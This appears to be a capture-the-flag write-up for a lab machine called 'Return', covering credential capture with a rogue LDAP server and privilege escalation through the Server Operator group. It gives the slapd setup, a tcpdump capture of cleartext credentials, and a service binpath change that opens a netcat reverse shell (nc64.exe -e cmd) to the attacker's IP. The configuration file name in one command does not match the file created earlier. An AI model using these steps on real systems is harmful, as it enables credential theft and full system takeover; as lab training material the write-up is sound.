# Return - Rogue LDAP printer / Server Operator groups

Reference: https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

## Method #1 - Netcat listener

- LDAP - no ssl for communications
- LDAPS - ssl communications

[image]

**Update**

[image]

## Method #2 - Rogue LDAP Server

Set up a rogue LDAP server to capture credentials in clear text.

1. **Installing LDAP-utils**

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils
```

[image]

2. **Set admin password**

[image]

3. **Configure server with dpkg-reconfigure:**

```bash
dpkg-reconfigure -p low slapd
```

- Omit OpenLDAP server configuration? **No**
- DNS domain name: target AD domain name (e.g. testdomain.com)
- Set password configured earlier
- Remove database when slapd is purged? **No**
- Move old database files? **Yes**

After finishing, start the slapd server:

```bash
sudo systemctl start slapd
```

Check current authentication mechanisms:

```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

[image]

Create `olcSaslSecProps.ldif` to support PLAIN and LOGIN:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Commit changes and restart:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcPlainAuthOnly.ldif
sudo service slapd restart
```

Verify:

```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Capture credentials with tcpdump:

```bash
sudo tcpdump -SX -i tun0 tcp port 389
```

- **S** flag prints packet sequence numbers
- **X** flag returns packet content

[image]

## Shell as Administrator

Server Operator group member can abuse services:

```bash
whoami /groups
```

[image]

```bash
sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.14.6 443"

sc.exe stop VSS
sc.exe start VSS
```

[image]
